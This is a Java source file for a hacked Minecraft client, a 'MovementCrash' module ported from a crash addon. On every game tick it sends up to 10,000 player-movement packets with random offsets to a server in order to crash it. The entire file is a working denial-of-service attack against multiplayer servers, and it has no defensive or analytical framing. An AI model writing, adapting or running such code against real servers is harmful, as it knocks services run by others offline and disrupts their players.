// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class MovementCrash extends Module {
    private final Setting<Integer> packets = new Setting<>("Packets", 2000, 1, 10000);

    public MovementCrash() {
        super("MovementCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || mc.getNetworkHandler() == null) return;
        Random r = new Random();
        Vec3d pos = mc.player.getPos();
        for (int i = 0; i < packets.getValue(); i++) {
            double dx = (r.nextDouble() - 0.5);
            double dy = (r.nextDouble() - 0.5);
            double dz = (r.nextDouble() - 0.5);
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                pos.x + dx, pos.y + dy, pos.z + dz,
                r.nextFloat() * 90, r.nextFloat() * 180, true));
        }
    }
}
